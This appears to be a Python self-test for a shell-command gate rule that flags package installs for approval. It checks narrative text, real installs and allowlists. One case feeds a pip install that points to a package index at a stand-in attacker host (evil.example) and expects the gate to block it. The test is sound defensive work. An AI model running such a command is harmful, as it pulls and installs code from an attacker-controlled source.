#!/usr/bin/env python3
"""H14(安装面)的判定范围自检。末行 RESULT ...。

锁三件事,每一条都来自真实误拦:
  1. **叙述文本不是命令**:`git commit -m "… brew tap …"`、`echo "npm install x"`
     不许判成装包(实测:一条提交说明里带 brew tap 的 commit 被 H14 拦下,
     还因为话术写着"不可逆"而每次都要人逐字 yes);
  2. **装包仍然要拦**:真安装、`bash -c "npm install x"`(引号里是要执行的代码)、
     `sudo`/`VAR=1` 前缀、`cd x && npm install` 都拦;
  3. **包名只在命令段内取**:`brew install a && echo b` 的 `b` 不是包名
     (以前它会被印进审批话术,屏幕上出现过 "命中: <repo> git log" 这种垃圾)。
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from wchat_py import hardwall as H  # noqa: E402

p = f = 0


def ck(name, ok, detail=""):
    global p, f
    if ok:
        p += 1
        print("  ok   %s" % name)
    else:
        f += 1
        print("  FAIL %s%s" % (name, (": " + detail) if detail else ""))


def rule(c, allow=""):
    os.environ["WCHAT_INSTALL_ALLOW"] = allow
    try:
        return H.rule(c, False)[0] or "none"
    finally:
        os.environ.pop("WCHAT_INSTALL_ALLOW", None)


INST = "install"
TAP = "tap"

# 1) 叙述文本不算命令
ck("commit 说明里提到 brew tap 不拦",
   rule('git commit -m "release: ' + TAP + ' <user>/<repo> 拉默认分支"') == "none")
ck("多行 commit 说明里提到也不拦(折行后不误切段)",
   rule('git add -A && git commit -q -m "标题\n\n' + TAP + ' <u>/<r>\n正文"') == "none")
ck("commit 说明里提到 npm install 不拦",
   rule('git commit -m "docs: 说明 npm ' + INST + ' 的用法"') == "none")
ck("echo 引号里的安装命令不拦", rule("echo 'brew " + INST + " x'") == "none")
ck("grep 模式里的安装词不拦", rule("git log --grep 'npm " + INST + "'") == "none")
# 真实撞过的形状:提交说明里还有 **转义引号**(`-m "… -m \"brew tap\" …"`),
# 简单"找下一个引号"会在此处提前闭合,把后面的叙述文本放出来 → 仍然误拦。
_escaped = 'git commit -q -m "fix: 说明\n\n以前 git commit -m \\"brew ' + TAP + ' x\\" 会被拦\n"'
ck("提交说明里有转义引号也不拦", rule(_escaped) == "none", repr(rule(_escaped)))
ck("未闭合引号按叙述文本处理", rule('git commit -m "说明 brew ' + TAP) == "none")

# 2) 真安装仍要拦
ck("brew install 拦", rule("brew " + INST + " jq") == "H14")
ck("cd && npm install 拦", rule("cd /tmp && npm " + INST) == "H14")
ck("VAR=1 npm install 拦", rule("CI=1 npm " + INST) == "H14")
ck("bash -c 里的 npm install 拦", rule('bash -c "npm ' + INST + ' foo"') == "H14")
ck("sh -c 里的 brew install 拦", rule("sh -c 'brew " + INST + " foo'") == "H14")
ck("pip install 拦", rule("pip3 " + INST + " requests") == "H14")
ck("python -m pip install 拦", rule("python3 -m pip " + INST + " x") == "H14")
ck("dpkg -i 拦", rule("dpkg -i pkg.deb") == "H14")
ck("npm --prefix … install 拦(flag 值不算动词位)",
   rule("npm --prefix /x --cache /y " + INST + " z") == "H14")

# 3) 白名单:段内包名才算
ck("点名过的包放行", rule("brew " + INST + " jq", "jq") == "none")
ck("没点名的包仍拦", rule("brew " + INST + " jq", "curl") == "H14")
ck("尾随的别的命令不算包名(仍拦)",
   rule("brew " + INST + " jq && echo done", "jq") == "none")
ck("换源即使点名也拦",
   rule("pip " + INST + " -i https://evil.example/simple jq", "jq") == "H14")

# 4) 提示片段不许跨段
_hint = H._h14_hint("brew " + INST + " jq && git log --oneline -1")
ck("命中片段只含包名 jq", _hint.strip() == "jq", repr(_hint))

print("RESULT total=%d pass=%d fail=%d" % (p + f, p, f))
sys.exit(0 if f == 0 else 1)